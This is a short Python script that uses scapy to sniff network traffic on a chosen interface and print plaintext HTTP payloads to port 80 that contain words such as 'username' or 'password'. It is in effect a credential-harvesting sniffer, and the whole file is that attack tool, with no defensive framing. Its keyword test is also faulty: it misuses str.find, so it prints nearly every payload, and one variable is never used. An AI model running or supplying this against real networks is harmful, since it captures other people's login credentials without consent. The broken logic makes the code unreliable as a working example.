import scapy.all as scapy
import re
wordlist=['username','user','UserName','userName','Username','usr','pass','PASS','password','Password']
def httpSniff(pkt):
	if pkt.haslayer(scapy.TCP):
		if pkt.getlayer(scapy.TCP).dport==80:
			if not(pkt.getlayer(scapy.Raw)==None):
				addr=str(pkt.getlayer(scapy.IP).dst)
				text=str(pkt.getlayer(scapy.Raw))
				for word in wordlist:
					if text.find(word):
						print(text)
						break
def main():
	intrface=str(input("Enter interface to sniff"))
	print("Starting sniffer on "+intrface)
	scapy.sniff(iface=intrface,prn=httpSniff)
main()
